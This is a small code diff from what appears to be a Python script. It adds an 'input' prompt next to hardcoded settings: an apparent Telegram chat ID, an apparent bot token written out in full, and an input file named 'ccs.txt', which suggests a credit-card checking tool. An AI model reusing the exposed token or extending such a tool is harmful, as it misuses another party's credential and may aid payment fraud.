@@ -42,7 +42,7 @@ print(C+lo)
 
 o=("»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»»")
 print(Z+o)
-	
+Click = input('Press Enter')
 ido = '-1001840965165'
 tokno = '5088805170:AAG_74FMrJsVfRs_d2TujhUJNUv3P80wL5Y'
 NMF = 'ccs.txt'
